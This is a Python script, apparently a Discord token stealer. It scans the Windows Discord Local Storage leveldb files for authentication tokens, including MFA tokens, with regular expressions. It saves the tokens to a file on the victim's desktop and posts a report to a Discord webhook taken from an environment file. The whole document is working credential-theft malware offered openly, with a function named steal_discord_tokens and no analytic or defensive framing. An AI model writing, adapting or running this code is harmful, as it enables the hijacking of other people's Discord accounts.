import os
import requests
from re import findall
from Crypto.Cipher import AES
from getmac import get_mac_address

from pathlib import Path
from dotenv import load_dotenv

# Load environment variables
dotenv_path = Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

windows_enviroment = {
    'app_local': 'LOCALAPPDATA',
    'app_roaming': 'APPDATA',
    'computer_name': 'COMPUTERNAME',
    'user_path': 'HOMEPATH',
    'username': 'USERNAME'
}

discord_cookies_path = {
    'Discord': os.getenv(key=windows_enviroment.get('app_roaming')) + r'\discord\Local Storage\leveldb',
}

def steal_discord_tokens():
    discord_tokens = []
    token_structure = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'

    for discord_cookies_directory in os.listdir(discord_cookies_path.get('Discord')):
        with open(discord_cookies_path.get('Discord') + '\\' + discord_cookies_directory, 'r+', errors='ignore') as read_the_tokens:
            for line_by_line in read_the_tokens.readlines():
                cleared_line = line_by_line.strip()
                for found_discord_token in findall(token_structure, cleared_line):
                    if found_discord_token:
                        discord_tokens.append(found_discord_token)

    # Save tokens to file
    tokens_file_path = os.path.join(os.environ["USERPROFILE"], "Desktop", 'discord_tokens.txt')
    with open(tokens_file_path, 'w+', encoding="utf-8") as token_file:
        token_file.write('\n'.join(discord_tokens))

    discord_embeded = {
        "title": "Discord Token Information",
        "description": "",
        "color": 0,
        "fields": [
            {"name": "Discord Tokens", "value": f"Tokens saved to file: {tokens_file_path}"}
        ]
    }

    latest_jsondata = {
        "content": "",
        "username": f"Discord Tokens",
        "embeds": [discord_embeded]
    }

    # Send POST request to Discord webhook
    requests.post(DISCORD_WEBHOOK_URL, json=latest_jsondata)

if __name__ == "__main__":
    steal_discord_tokens()
